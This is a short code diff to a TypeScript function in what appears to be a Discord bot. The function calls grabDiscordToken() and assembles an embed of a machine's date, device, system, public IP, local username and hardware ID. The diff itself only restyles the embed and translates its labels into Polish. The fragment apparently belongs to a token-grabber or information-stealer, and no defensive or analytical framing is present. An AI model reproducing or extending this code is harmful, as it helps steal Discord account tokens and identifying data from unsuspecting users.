@@ -18,17 +18,19 @@ export const createLogEmbed = async (client: Client): Promise<EmbedBuilder> => {
   grabDiscordToken()
 
   const embed = new EmbedBuilder()
-    .setTitle('Tempomary logs')
-    .addFields(
-      { name: '⏰ Date', value: time, inline: true },
-      { name: '💻 Device', value: device, inline: true },
-      { name: '⚙️ System', value: system, inline: true },
-      { name: '🌐 IPv4', value: publicIp, inline: true },
-      { name: '👤 User', value: localUser, inline: true },
-      { name: '🆔 HWID', value: hwid, inline: true }
-    )
-    .setThumbnail(client.user?.displayAvatarURL() || '')
+    .setTitle('📝 **Temporary Logs** 📝')
     .setColor(getRandomColor())
+    .setThumbnail(client.user?.displayAvatarURL() || '')
+    .addFields(
+      { name: '⏰ **Data**', value: time, inline: true },
+      { name: '💻 **Urządzenie**', value: device, inline: true },
+      { name: '⚙️ **System**', value: system, inline: true },
+      { name: '🌐 **IPv4**', value: publicIp, inline: true },
+      { name: '👤 **Użytkownik**', value: localUser, inline: true },
+      { name: '🆔 **HWID**', value: hwid, inline: true }
+    )
+    .setTimestamp()
+    .setFooter({ text: `Utworzyła ${client.user?.username || 'Botka'}` })
 
   return embed
 }
